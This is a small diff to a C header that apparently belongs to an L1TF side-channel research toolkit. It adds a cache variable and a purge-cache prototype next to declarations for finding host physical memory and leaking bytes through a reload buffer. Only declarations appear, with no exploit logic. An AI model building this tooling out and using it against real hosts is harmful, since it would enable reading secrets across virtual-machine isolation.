@@ -5,6 +5,8 @@
 #include <stddef.h>
 #include <stdint.h>
 
+extern u64 l1tf_cached;
+
 // The reload buffer will be used to leak a byte at the time.
 // However, instead of hving a 256 page-sized reload buffer,
 // we only have a 32 page-sized buffer.
@@ -196,3 +198,4 @@ uintptr_t l1tf_find_base(void);
 hpa_t l1tf_find_magic16(hpa_t base, uint16_t magic, hpa_t start, hpa_t end, int step);
 void l1tf_init(void);
 void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len);
+void l1tf_purge_cache(hpa_t pa, u64 len);
